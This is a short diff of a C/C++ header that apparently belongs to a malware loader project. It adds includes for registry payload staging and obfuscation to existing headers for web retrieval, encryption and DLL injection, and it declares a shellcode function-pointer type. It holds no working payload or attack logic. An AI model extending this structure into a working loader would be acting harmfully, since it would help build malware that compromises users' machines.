@@ -1,4 +1,7 @@
 #pragma once
+#pragma comment(lib, "kernel32.lib")
+#include "RegstryPayloadStaging.h"
+#include "Obfuscation.h"
 #include "WebRetrival.h"
 #include "UserInput.h"
 #include "SystemInteraction.h"
@@ -9,4 +12,5 @@
 #include "Externals.h"
 #include "Encryption.h"
 #include  "dllinjection.h"
+
 typedef  VOID(WINAPI* fnShellCode)();
